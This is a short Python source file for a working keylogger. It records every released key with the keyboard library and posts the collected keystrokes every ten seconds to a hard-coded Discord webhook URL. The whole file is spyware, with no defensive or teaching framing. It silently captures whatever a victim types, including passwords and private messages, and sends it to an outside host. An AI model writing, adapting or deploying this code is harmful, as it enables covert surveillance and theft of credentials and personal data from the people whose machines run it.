import keyboard
import time
import requests
import threading

# Replace 'WEBHOOK_URL'
WEBHOOK_URL = 'https://discord.com/api/webhooks/1431796100745920713/BtgSxp8t9jCSDL29NpsFYambywTI2pZf-02kA_GoQIRDjuVK-Zi-zX3brYGae68Uofp8'

# Create a list to store the captured keystrokes
keylogs = []

def send_keylogs():
    global keylogs
    if keylogs:
        
        keylogs_str = '\n'.join(keylogs)
        payload = {
            'content': keylogs_str
        }
        requests.post(WEBHOOK_URL, data=payload)
        keylogs = []
    threading.Timer(10, send_keylogs).start()


def capture_keystrokes(event):
    global keylogs
    keylogs.append(event.name)

keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord every 10 seconds
send_keylogs()

while True:
    time.sleep(1)
